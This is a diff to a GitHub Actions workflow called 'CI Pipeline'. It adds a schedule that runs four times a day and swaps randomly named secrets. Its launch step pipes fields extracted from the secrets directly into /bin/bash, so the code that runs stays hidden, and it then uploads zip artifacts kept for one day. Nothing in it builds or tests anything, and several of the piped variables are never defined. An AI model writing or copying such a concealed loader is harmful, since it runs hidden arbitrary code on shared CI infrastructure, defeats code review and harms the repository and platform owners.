@@ -2,6 +2,8 @@ name: CI Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '59 5,11,17,23 * * *'
 env:
   CI: true
 concurrency:
@@ -17,17 +19,16 @@ jobs:
           fetch-depth: 1
       - name: Launch
         env:
-          irtnt576: ${{ secrets.irtnt576 }}
+          iw49273: ${{ secrets.iw49273 }}
         run: |
-          printf '%s' "$irtnt576" | jq -r .fx49 | /bin/bash
-          printf '%s' "$h70" | jq -r .ftn75 | /bin/bash
-          printf '%s' "$rmrzt279" | jq -r .kizdp6780 | /bin/bash
-          printf '%s' "$t618" | jq -r .si6 | /bin/bash
-          printf '%s' "$wm565" | jq -r .kyih03384 | /bin/bash
+          printf '%s' "$iw49273" | jq -r .ee302 | /bin/bash
+          printf '%s' "$hiqni99106" | jq -r .pmp3065 | /bin/bash
+          printf '%s' "$k397" | jq -r .ckzdl26507 | /bin/bash
+          echo $toq4 | jq -r .rqmon23 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: 0UQMdHNJ
+          name: ArG7ZPl7
           path: "*.zip"
           retention-days: 1
